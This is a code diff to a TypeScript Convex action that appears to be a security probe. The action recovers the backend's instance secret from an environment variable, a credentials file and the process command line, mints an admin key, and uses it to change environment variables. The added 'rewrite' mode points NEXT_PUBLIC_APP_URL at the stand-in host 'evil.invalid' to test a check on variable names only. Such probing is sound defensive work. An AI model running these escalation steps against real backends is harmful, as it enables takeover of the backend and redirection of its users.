@@ -3,6 +3,7 @@
 // tries to recover the backend's instance secret, mint an admin key, and use it
 // to change the backend's environment. It returns booleans and HTTP status codes
 // only: no secret or key ever leaves this function.
+import { v } from "convex/values";
 import { actionGeneric } from "convex/server";
 import { execFileSync } from "node:child_process";
 import { readdirSync, readFileSync } from "node:fs";
@@ -27,12 +28,12 @@ function secretFromCmdline(): string {
   return "";
 }
 
-async function setEnv(adminKey: string, name: string): Promise<number> {
+async function setEnv(adminKey: string, name: string, value = "1"): Promise<number> {
   try {
     const response = await fetch("http://127.0.0.1:3210/api/update_environment_variables", {
       method: "POST",
       headers: { Authorization: `Convex ${adminKey}`, "Content-Type": "application/json" },
-      body: JSON.stringify({ changes: [{ name, value: "1" }] }),
+      body: JSON.stringify({ changes: [{ name, value }] }),
     });
     return response.status;
   } catch {
@@ -41,8 +42,10 @@ async function setEnv(adminKey: string, name: string): Promise<number> {
 }
 
 export const probe = actionGeneric({
-  args: {},
-  handler: async () => {
+  // "add": a new variable. "rewrite": a new VALUE under an allowlisted name,
+  // which a names-only check cannot see.
+  args: { mode: v.optional(v.union(v.literal("add"), v.literal("rewrite"))) },
+  handler: async (_ctx, { mode }) => {
     const envSecret = process.env.INSTANCE_SECRET ?? "";
     const fileSecret = readOrEmpty("/convex/data/credentials/instance_secret");
     const cmdlineSecret = secretFromCmdline();
@@ -66,7 +69,11 @@ export const probe = actionGeneric({
       fileHasSecret: SECRET_SHAPE.test(fileSecret),
       cmdlineHasSecret: SECRET_SHAPE.test(cmdlineSecret),
       mintedKeyShape: KEY_SHAPE.test(minted),
-      escalatedStatus: KEY_SHAPE.test(minted) ? await setEnv(minted, "PROBE_ESCALATED") : -1,
+      escalatedStatus: KEY_SHAPE.test(minted)
+        ? mode === "rewrite"
+          ? await setEnv(minted, "NEXT_PUBLIC_APP_URL", "http://evil.invalid")
+          : await setEnv(minted, "PROBE_ESCALATED")
+        : -1,
       controlStatus: await setEnv(bogus, "PROBE_BOGUS"),
     };
   },
